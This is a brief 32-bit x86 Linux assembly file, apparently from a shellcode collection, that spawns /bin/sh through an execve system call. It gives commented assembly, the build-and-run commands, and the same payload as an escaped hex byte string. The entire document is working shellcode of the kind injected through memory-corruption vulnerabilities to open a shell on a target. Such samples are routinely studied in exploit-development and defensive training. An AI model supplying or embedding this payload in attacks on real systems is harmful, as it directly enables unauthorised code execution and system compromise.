# execv /bin//sh 32bits by notsgnik
# as --32 -o test.o test.s && ld -m elf_i386 -o test test.o && ./test
#
# http://www.shell-storm.org/shellcode/files/syscalls.html
#
# "\x31\xc0\x50\x68\x2f\x2f\x73\x68"
# "\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
# "\x0b\xcd\x80"

xor     %eax,%eax       # cleaning eax register

push    %eax            # since eax = 0 and a string need a nullbyte as "period"
push    $0x68732f2f     # continuing the string from end "hs//" ( // = / , it was more convinient )
push    $0x6e69622f     # "nib/"

mov     %esp,%ebx       # since the stack pointer point to the bigining of the string and execve need this adress in ebx 
mov     $0xb, %al       # making eax = 11 ( syscall for execve )
int     $0x80           # make the call

